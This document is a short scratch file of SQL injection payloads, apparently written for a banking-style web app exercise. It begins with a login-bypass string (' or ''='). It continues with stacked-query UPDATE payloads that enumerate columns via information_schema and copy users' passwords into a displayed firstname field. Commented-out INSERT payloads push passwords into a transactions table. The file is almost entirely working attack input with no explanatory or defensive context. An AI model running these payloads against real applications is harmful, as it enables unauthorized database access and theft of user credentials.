' or ''='

-- deposit 10
-- Show that we can display on the screen
-- Show we can display text to the screen
UPDATE users set firstname = 'justin_b' WHERE users.firstname = 'justin' #


UPDATE users set firstname = (SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = 'users' and COLUMN_NAME like '%id%' LIMIT 1) where firstname = 'justin'; #

1); UPDATE users set firstname = (SELECT firstname FROM users WHERE users.id = 21) WHERE users.firstname = '20' # 

1); UPDATE users set firstname = (SELECT id FROM users WHERE users.firstname = 'id') WHERE users.firstname = 'id' # 

1); UPDATE users set firstname = (SELECT firstname FROM users WHERE users.id = 22) WHERE users.firstname = 'big_bob' # 

1); UPDATE users set firstname = (SELECT password FROM users WHERE users.id = 22) WHERE users.firstname = 'admin' # 
-- UPDATE users set firstname = (SELECT COLUMN_NAME AS `Field` FROM information_schema.COLUMNS WHERE TABLE_NAME = 'transaction' and COLUMN_NAME like '%id%' LIMIT 1); #

-- UPDATE users set firstname = (SELECT COLUMN_NAME AS `Field` FROM information_schema.COLUMNS WHERE TABLE_NAME = 'account' and COLUMN_NAME like '%user%' LIMIT 1); #

-- 1); INSERT INTO transactions (account_transaction_ID, amount) SELECT '1025', password FROM users WHERE users.firstname = 'justin' #

-- 1); INSERT INTO transactions (account_transaction_ID, amount) SELECT '1025', password FROM users WHERE users.id = 20 #